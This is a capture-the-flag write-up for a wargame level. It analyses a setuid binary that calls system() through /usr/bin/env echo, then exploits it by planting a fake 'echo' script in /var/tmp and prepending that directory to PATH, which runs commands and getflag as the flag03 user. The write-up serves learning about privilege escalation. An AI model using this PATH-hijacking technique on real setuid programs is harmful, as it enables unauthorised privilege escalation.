## Phase 1: Reconnaissance

As with previous levels, the first step was to inspect the current directory and identify any unusual files

- `ls -la` reveals an executable file named `level03`

Running the binary prints a message explicitly asking to be exploited, indicating that this level focuses on **binary analysis and exploitation**

---

## Phase 2: Binary Analysis

We can learn more about with `file` command:

```bash
file ./level03
```

Output:

```txt
./level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, not stripped
```


Next, we use `strings` on the binary to get all readable human text:

```bash
strings ./level03
```

This confirms the binary was compiled from C code (GNU C 4.6.3)  
A search for common vulnerable functions (`strcpy`, `gets`, `scanf`, `sprintf`, `memcpy`) did **not** reveal anything exploitable


---

### Dynamic Analysis

Using `ltrace`, library calls made by the program were observed:

```bash
ltrace ./level03
```

This revealed a call to:

```c
system("/usr/bin/env echo Exploit me");
```

This is a critical finding.

---

### Static Analysis

- The binary was transferred to the local machine and opened in https://dogbolt.org
- The `main` function was identified as:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4;
  int v5;

  v4 = getegid();
  v5 = geteuid();
  setresgid(v4, v4, v4);
  setresuid(v5, v5, v5);
  return system("/usr/bin/env echo Exploit me");
}
```


- As we can see the program executes a system call `/usr/bin/env echo Exploit me`
- This means the binary does **not** call `/bin/echo` directly, but instead executes the **first `echo` found in $PATH**, which can be manipulated
- To exploit this, we need to add a directory of our own in $PATH and create a file that we call "echo" that will run our code
- Now when the program runs `system("/usr/bin/env echo Exploit me");`, it will run our evil echo instead
- This means we can run code with the privileges of flag03
---

## Phase 3: Exploitation

To exploit this behavior, we need to find directories where we can write code:

```bash
find / -type d -writable 2>/dev/null
```

A writable directory (`/tmp`) was found. We used this to create a **fake `echo`**.

### Proof of Concept

A simple script was created to confirm code execution:

```bash
echo "EXPLOITED" > /var/tmp/echo
chmod +x /var/tmp/echo
```

The directory was then added to the beginning of the `PATH` variable:

```bash
export PATH=/var/tmp:$PATH
```

Running the binary again prints `EXPLOITED`, confirming that the fake `echo` was executed instead of the system one.

---

### Privilege Confirmation

- Replacing the script contents with:

```bash
whoami
```

- Printed:

```
flag03
```

- This confirms that the commands are executed with the **privileges of `flag03`**


#### - We then replace `whoami` inside our echo script with `getflag` and successfully obtain the token and access to level04
